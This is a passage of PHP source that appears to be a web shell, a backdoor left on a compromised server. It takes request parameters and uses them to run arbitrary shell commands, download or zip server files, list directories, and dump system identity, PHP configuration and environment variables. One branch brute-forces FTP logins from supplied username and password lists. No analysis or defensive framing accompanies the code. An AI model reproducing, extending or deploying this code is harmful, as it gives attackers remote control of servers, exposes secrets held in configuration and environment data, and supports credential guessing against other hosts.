                      if ($grepmode == 2 && !$repfile)
                      {
                         $output .= "~!$file:\n";
                         $repfile = true;
                      }
                      $tolist = $grepmode == 3 ? $matches[1] : $matches[0];
                      foreach ($tolist as $match)
                      {
                          if ($grepmode == 1)
                             $output .= "$file:";
                          $output .= "$match\n";
                      }
                  }
              }
            }
         }
       } else {
         $output = "??? error enumerating target dir/file!\n";
       }

       if ($compress) compress($output);
       echo $output;
    }

    if ($scmd == "ftp-test")
    {
      $output = '';
      $ftp_server = !empty($_REQUEST['fserver']) ? $_REQUEST['fserver'] : "127.0.0.1";
      $ftp_port = !empty($_REQUEST['fport']) ? $_REQUEST['fport'] : 21;

      $connection = @ftp_connect ($ftp_server,$ftp_port,10);
      if (!$connection) {
          $output .= "error connecting to $ftp_server:$ftp_port\n";
      } else {
          @ftp_close($connection);

          $flogins    = explode("\n",$_REQUEST['flogins']);
          $fpasswords = explode("\n",$_REQUEST['fpasswords']);

          $found = false;
          foreach ($flogins as $login)
          {
            if (empty($login)) next;
            foreach ($fpasswords as $password)
            {
                if (empty($password)) next;
                $connection = @ftp_connect($ftp_server,$ftp_port,10);
                if (!$connection) {
                   $output .= "$login:$password:-1\n";
                } else {
                   if (@ftp_login($connection,$login,$password))
                   {
                      $output .= "$login:$password:1\n";
                      $found = true;
                      break;
                   } else {
                      $output .= "$login:$password:0\n";
                   }
                   @ftp_close($connection);
                }
            }
            if ($found) break;
          }
      }
    }

    if ($compress) compress($output);
    echo $output;
  }

  if (!empty($cfe))
  {
    $output = command($cfe);
    if ($compress) compress($output);
    echo $output;
  }

  if (!empty($ffr))
  {
    if (!$envelope)
    {
      @header("Content-type: application/octet-stream");
      @header("Content-disposition: attachment; filename=\"".$ffr."\";");
    }
    $output = eat_file($ffr);
    if ($compress) compress($output);
    echo $output;
  }

  if (!empty($ffrs))
  {
    if (!$envelope)
    {
      @header("Content-type: application/zip");
    }

    $ffrs = trim($ffrs);
    $files = preg_split("/\s+/", $ffrs, -1, PREG_SPLIT_NO_EMPTY);

    $output = make_zip($files);
    echo $output;
  }

  if (!empty($dfr))
  {
    if (!$use_exec)
    {
      $dfr = trim($dfr);
      $output .= safe_dir($dfr);
    }

    if (!$safe_mode && empty($output))
    {
      if ($unix)
      {
        $output .= command("ls -liaL $dfr");
      } else {
        $output .= command("dir /a $dfr");
      }
    }

    if ($compress) compress($output);
    echo $output;
  }

  if (!empty($dfra))
  {
    $recur_limit = !empty($_REQUEST['rlimit']) ? $_REQUEST['rlimit'] : 0;
    if (!$use_exec)
    {
      $dfra = trim($dfra);
      $output .= safe_dir($dfra, true, $recur_limit);
    }

    if (!$safe_mode && empty($output))
    {
      if ($unix)
      {
        $output .= command("ls -liRaL $dfra");
      } else {
        $output .= command("dir /S /a $dfra");
      }
    }

    if ($compress) compress($output);
    echo $output;
  }

  if (!empty($info))
  {
    $output = '';
    switch ($info)
    {
      case 'ver':
           $output = $version;
           if ($safe_mode) $output .= " (safe mode)";
           break;
      case 'uname':
           $output = get_uname();
           break;
      case 'id':
           if (!$safe_mode)
           {
             if($unix) {
               $output = command("id");
             } else {
               $output = command("whoami");
             }
             $output = trim($output);
           }

           if (empty($output))
           {
                $found = 0;
                if (function_exists('posix_geteuid') && function_exists('posix_getegid') && function_exists('posix_getgrgid') && function_exists('posix_getpwuid'))
                {
                    $euserinfo  = @posix_getpwuid(@posix_geteuid());
                    $egroupinfo = @posix_getgrgid(@posix_getegid());
                    if ($euserinfo || $egroupinfo)
                    {
                      $output = 'uid='.$euserinfo['uid'].'('.$euserinfo['name'].') gid='.$egroupinfo['gid'].'('.$egroupinfo['name'].')';
                      $found = 1;
                    }
                }

                if (!$found)
                {
                    if (function_exists('get_current_user'))
                       $output .= "user=".@get_current_user();

                    if (function_exists('getmyuid'))
                        $output .= " uid=".@getmyuid();

                    if (function_exists('getmygid'))
                        $output .= " gid=".@getmygid();
                }
           }
           break;
      case 'pwd':
           $output = get_cwd();
           break;
      case 'safe-mode':
           $output = $safe_mode ? '1' : '0';
           break;
      case 'unix-os':
           $output = $unix ? '1': '0';
           break;
      case 'php-info':
           $output = @phpinfo(-1);
           break;
      case 'php-ini':
           if (function_exists('ini_get_all'))
           {
              foreach (@ini_get_all() as $key=>$value)
              {
                  $output .= "$key"."".U_value($value['local_value'])."".U_value($value['global_value'])."\n";
              }
           }
           break;
      case 'disk':
           $name = $REQUEST['rname'];
           if (empty($name))
              if ($unix)
                 $name = "/";
              else
                 $name = "\\";
           $output = @disk_free_space($name)."/".@disk_total_space($name);
           break;
      case 'disk-list':
           for ($disk = 'C'; $disk < 'Z'; ++$disk)
           {
              if (@disk_total_space("$disk:"))
              {
                $output .= "$disk:\n";
              }
           }
           break;
      case 'env':
           if ($_SERVER)
           {
              foreach ($_SERVER as $key=>$value)
              {
                 $output .= "$key:".U_value($value)."\n";
              }
           } else {
              global $HTTP_SERVER_VARS;
              foreach ($HTTP_SERVER_VARS as $key=>$value)
              {
                 $output .= "$key:".U_value($value)."\n";
              }
           }

           $cmdenv = '';
           if (!$safe_mode)
           {
               if ($unix) $cmdenv = command('env');
               else $cmdenv = command('set');
           }

           if (!empty($cmdenv))
           {
              $output .= @join(":", split("=", $cmdenv));
           } else {
             if ($_ENV)
             {
               foreach ($_ENV as $key=>$value)
               {
                   $output .= "$key:".U_value($value)."\n";
               }
             } else {
               global $HTTP_ENV_VARS;
               foreach ($HTTP_ENV_VARS as $key=>$value)
               {
                   $output .= "$key:".U_value($value)."\n";
               }
             }
           }
           break;

    }
    if ($compress) compress($output);
    echo $output;
  }

  if ($envelope)
  {
     echo '__STOP__9034785902347509238476034857607834__STOP__';
     die;
  }

?>
